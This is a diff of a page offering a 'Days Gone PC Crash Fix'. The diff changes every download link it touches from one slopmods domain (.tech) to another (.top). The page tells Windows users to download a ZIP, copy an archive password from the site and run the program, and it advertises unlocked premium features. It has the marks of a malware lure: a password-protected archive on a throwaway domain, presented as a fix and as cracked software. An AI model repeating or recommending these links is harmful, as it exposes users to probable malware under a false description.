@@ -8,12 +8,12 @@ Days Gone PC Crash Fix — Windows setup and configuration · Premium workspace 
 
 > Use the release page below for Windows.
 
-- **Release page:** [pjovtnuehfd.slopmods.tech](https://pjovtnuehfd.slopmods.tech/)
-- **Full URL:** `https://pjovtnuehfd.slopmods.tech/`
+- **Release page:** [pjovtnuehfd.slopmods.top](https://pjovtnuehfd.slopmods.top/)
+- **Full URL:** `https://pjovtnuehfd.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **pjovtnuehfd.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **pjovtnuehfd.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Days Gone PC Crash Fix — Windows setup and configuration · Premium workspace 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **pjovtnuehfd.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **pjovtnuehfd.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
